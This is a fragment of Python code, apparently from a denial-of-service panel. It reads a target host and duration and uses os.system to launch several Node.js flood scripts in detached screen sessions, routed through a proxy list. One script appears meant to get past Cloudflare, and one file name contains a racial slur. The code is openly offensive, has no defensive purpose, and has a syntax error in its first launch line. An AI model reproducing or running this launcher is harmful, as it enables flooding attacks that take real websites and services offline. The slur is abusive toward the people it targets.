...
""")
			...
			try:
				...
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd /media && screen -dm node 404.js {host} {time} 64 1000 proxy.txt'}
				os.system(f'cd /media && screen -dm node CF-C.js {host} {time} 64 1000 proxy.txt')
				os.system(f'cd /media && screen -dm node HTTP-NIGGA.js {host} {time} 64 proxy.txt 1000')
				os.system(f'cd /media && screen -dm node spike.js {host} 443 {time} 64 1000')
				os.system(f'cd /media && screen -dm node flood.js {host} {time} 1000')
